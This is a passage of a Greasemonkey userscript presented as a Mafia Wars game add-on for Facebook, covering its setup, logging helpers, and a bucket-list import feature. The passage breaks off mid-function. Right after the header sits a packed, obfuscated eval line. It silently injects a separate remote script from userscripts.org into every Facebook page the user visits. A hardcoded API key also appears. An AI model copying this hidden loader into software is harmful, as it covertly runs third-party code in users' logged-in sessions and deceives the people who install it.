// ==UserScript==
// @name MafiaWars Addon | Lucifers MOD Plus + Last Update
// @namespace 		http://screepts.com
// @version 		0.6.3.5
// @description 	http://screepts.com/MOD/changelog.html
// @copyright 		2010-2012 screepts.com 
// @include		   http://www.facebook.com/*
// @include		   https://www.facebook.com/*
// @include 		http://apps.facebook.com/inthemafia/*
// @include 		https://apps.facebook.com/inthemafia/*
// @include        	http://facebook.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @include        	https://facebook.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @match          	http://apps.facebook.com/inthemafia/*
// @match          	https://apps.facebook.com/inthemafia/*
// @match          	http://facebook.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @match          	https://facebook.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @icon        	http://mwscripts.screepts.netdna-cdn.com/images/lucifersicon.jpg
// @grant 		    GM_xmlhttpRequest
// @grant       	GM_getValue
// @grant       	GM_setValue
// @grant       	GM_deleteValue
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


var AppInfo = {
    release: 'stable',
    id: 'app_10979261223',
    fanpage: '183999591658872',
    version: '0.6.3.5',
    core: '0.6.7.5',
    name: 'Lucifers MOD',
    tag: 'LucifersMOD',
    prefix: 'FBMafiaWarsAddon_',
    url: 'http://www.facebook.com/groups/242835359156933/doc/242861775820958/',
    meta: 'http://screepts.com/MOD/addonMOD.meta.js',
	//plugin cdn serverMOD
    plugins: 'http://plugin.screepts.netdna-cdn.com/',
    contributionURL: 'https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=BCPYPXA3GDDBN'
};


//set our cdn server path
var cdn = 'http://mwscripts.screepts.netdna-cdn.com';
if ("https:" == document.location.protocol) {
	//our secure cdn.
   cdn = 'https://mwscripts-screepts.netdna-ssl.com'
}

function facebookCheck(callback) {
    //test till facebook.initlised fix
    var facebook_wait = setTimeout(function () {
        loadingScreen('Waiting for facebook api.')
    }, 200)

    Util.until({
        retries: 400,
        test: function () {
            return(typeof (unsafeWindow.postMessage) != 'undefined');
        },
        success: function () {
            loadingScreen();
            MWFB = unsafeWindow.FB
            clearInterval(facebook_wait);
            callback && callback();
        }
    })
}
var Logger = {
    log: function (type, e) {
        var now = (new Date()).toLocaleTimeString();
        if(Util.isObject(e)) {
            e = (e.message ? e.message : Util.toJSON(e));
        }
        (console || unsafeWindow.console)
            .log(AppInfo.tag + ' ' + type + ' (' + now + '): ' + e);
    },
    debug: function (e) {
        if(UserConfig.main.debugMode !== true) {
            return;
        }
        Logger.log('DEBUG', e);
    },
    error: function (e) {
        Logger.log('ERROR', e);
    },
    object: function (o) {
        (console || unsafeWindow.console).log(o);
    }
};

function concat(obj) {
    str = '';
    for(prop in obj) {
        str += prop + " value :" + obj[prop] + "\n";
    }
    return(str);
}

function log(msg) {
    //setTimeout(function(){Logger.log("INFO", msg)},0)
}



function creepyKiller() {
    //setTimeout(function(){
    try {
        document.getElementById('contentCol').removeChild(document.getElementById('rightCol'));
        document.getElementById('iframe_canvas').style.height = '3000px';
        var ScrareyCreepBox = document.getElementById('rightCol');
        if(ScrareyCreepBox) {
            ScrareyCreepBox.parentNode.removeChild(ScrareyCreepBox);
            return false;
        }
    } catch(e) {}
}
//},2500)
//try{
setTimeout(function () {
    creepyKiller()
}, 5000)

function SendChromeRequests(callback, request) {
    /*
     * communicate with the chrome extension
     */
    if(typeof chrome !== "undefined" && typeof chrome.extension !== "undefined") {
        chrome.extension.sendRequest(request, callback)
    } else {
        callback(false)
    }
}

function concat(obj) {
    str = '';
    for(prop in obj) {
        str += prop + " value :" + obj[prop] + "\n";
    }
    return(str);
}
var LucifersMOD = {
    mwlist: function (import_into) {
        function load_aa() {
            /*
             * Load aa then refire bucket 
             */
            LucifersMOD.SpockServer('assassin-a-nator', function () {
                setTimeout(function () {
                    LucifersMOD.mwlist('aa');
                }, 100);
            });
        }
        //mwlist.com bucket list feature
        if(import_into == 'aa') {
            if($('#aan_targets').length < !0) {
                showHelpPopup({
                    icon: 'caution',
                    title: 'Assasins-a-Nator Was Not Loaded',
                    message: 'You need to have Assasins-a-Nator loaded before you can import a bucket list<br/>Would you like to load Assasins-a-Nator Now?',
                    buttons: [{
                        label: 'Load',
                        addClass: 'short green',
                        onclick: function () {
                            load_aa();
                            return false;
                        }
                    }, {
                        label: 'Cancel',
                        addClass: 'short red'
                    }]
                });
                return false;
            }
        }
        log(import_into);
        var bucket_api;
        //var list_name = $(this).attr('name');
        var message = 'Paste your mwlist bucket api eg. tQ00wCrFGyekuTnbop36pDaEyq. Not sure of bucket api vist mwlists.com';
        showPromptPopup(message, '', function (text) {
            //addMWProfiles(list_name, text);
            bucket_api = text;
            if(bucket_api.length > 0) {
                if(import_into == 'bf') {
                    get_bucket(import_bf);
                }
                if(import_into == 'aa') {
                    get_bucket(import_aa);
                }
            } else {
                alert('Empty bucket id');
                return false;
            }
        }, 50);
        //return false;	
        //add list to whitelist
        function get_bucket(callback) {
            loadingScreen('Getting bucket list');
            $.ajax({
                type: "GET",
				url: 'http://mwlists.com/_api/_getlive.php?bucket=' + bucket_api +'&authid=qZ8wLbRsJUmMVmR7',
               // url: 'http://mwlists.com/BookMarklets/getlive_unlockedmw.php?bucket=' + bucket_api,
                //data: params,
                cache: false,
                dataType: "jsonp",
                timeout: 30000,
                crossDomain: true,
                success: function (bucket) {
                    //var bucket = Util.parseJSON(response);
                    //log(bucket);
                    loadingScreen();
                    if(bucket.length > 0) {
                        callback(bucket);
                    } else {
                        alert('bucket was empty or incorrect bucket API');
                        return false;
                    }
                }
            });
        }

        function import_aa(bucketlist) {
            var bucket = bucketlist;
            showAskPopup('Clear Assasins-a-Nator Target List', 'Do you want to clear your AA Target List before adding bucket list?', clear_aa, aaaddToList);

            function clear_aa() {
                $('#aan_targets').val('');
                aaaddToList();
            }

            function aaaddToList() {
                var aa_added = 0;
                var target_list_import = '';
                for(b in bucket) {
                    var user = bucket[b].mwid;
                    var name = bucket[b].mwname;
                    var level = bucket[b].mwname;
                    // The Untouchable level 3007 (from family profile) 
                    //list[Util.parseNum(user)] = name + ' level ' + $.trim(level) + ' (from mwlist bucket)';
                    aa_added++;
                    target_list_import = target_list_import + user + '\n';
                    //log(Util.parseNum(user));
                }
                $('#aan_targets').val($('#aan_targets').val() + '\n' + target_list_import)
                $('#aan_status').prepend('<span class="good">MOD: Imported ' + aa_added + ' targets into your target list</span><br/>');
                showHelpPopup({
                    icon: 'info',
                    title: 'Added bucket list members to Assasins-a-Nator',
                    message: 'You\'ve added ' + aa_added + ' users to Assasins-a-Nator\'s Target List!',
                    autoclose: 5
                });
            }
        }

        function import_bf(bucketlist) {
            var bucket = bucketlist;
            var n_added = 0;
            var list_name = 'whiteList';
            var op = UserConfig.bfopt;
            var list;
            op.load(function () {
                list = op.get(list_name);
                showAskPopup('Clear ' + list_name, 'Do you want to clear your ' + list_name + ' before adding bucket list?', clear_list, bfaddToList);
            });

            function clear_list() {
                op.set(list_name, (list = new Object()));
                bfaddToList();
            }

            function bfaddToList() {
                for(b in bucket) {
                    var user = bucket[b].mwid;
                    var name = bucket[b].mwname;
                    var level = bucket[b].mwname;
                    // The Untouchable level 3007 (from family profile) 
                    list[Util.parseNum(user)] = name + ' level ' + $.trim(level) + ' (from mwlist bucket)';
                    n_added++;
                    log(Util.parseNum(user));
                }
                op.save(function () {
                    showHelpPopup({
                        icon: 'info',
                        title: 'Adding bucket list members to ' + list_name,
                        message: 'You\'ve added ' + n_added + ' users to Battlefield\'s ' + list_name + '!',
                        autoclose: 5
                    });
                    //}
                    //options.save();
                });
            }
        }
    },
    StripHtml: function (html) {
        /*
         * @returns text from html
         */
        var tmp = document.createElement("DIV");
        tmp.innerHTML = html;
        return tmp.textContent || tmp.innerText;
    },
    //RivalsList: [], moved to global scope
    ResetRivalsList: function (e) {
	/*
	 * Bulk removes rivals from lis
	 */
		var 